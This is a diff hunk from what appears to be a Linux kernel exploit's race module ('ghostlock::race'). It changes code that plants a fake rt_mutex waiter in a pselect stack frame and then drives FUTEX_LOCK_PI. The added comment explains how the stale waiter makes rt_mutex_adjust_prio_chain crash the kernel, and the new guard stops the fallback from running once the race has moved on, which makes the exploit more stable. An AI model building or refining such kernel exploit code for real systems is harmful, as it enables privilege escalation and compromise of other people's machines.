@@ -132,7 +132,18 @@ namespace ghostlock::race {
                                             ? (calls_this_seq % 19) + 1
                                             : kernel::PSELECT_CONSUMER_NICE;
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
-                    if (sched_ret != 0) {
+                    /* This fallback enters futex_lock_pi, and a timeout there runs
+                     * rt_mutex_cleanup_proxy_lock -> rt_mutex_adjust_prio_chain on
+                     * this task -- a walk that dereferences task->pi_blocked_on,
+                     * which still points at the fake waiter stamped into a pselect
+                     * stack frame. Once that frame has been reused, waiter->lock is
+                     * garbage and the walk data-aborts at
+                     * rt_mutex_adjust_prio_chain+0x188 (the 2026-10-09 oops). So
+                     * run it only while this sequence is still being driven: after
+                     * the route has moved on, the syscall can only walk a stale
+                     * waiter. See docs/analysis/stale-waiter-lifetime-plan.md. */
+                    if (sched_ret != 0 && !race->consumer_stop.load() &&
+                        race->consumer_go.load() == seq) {
                         struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                         long fret = support::futex_op(
                             &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
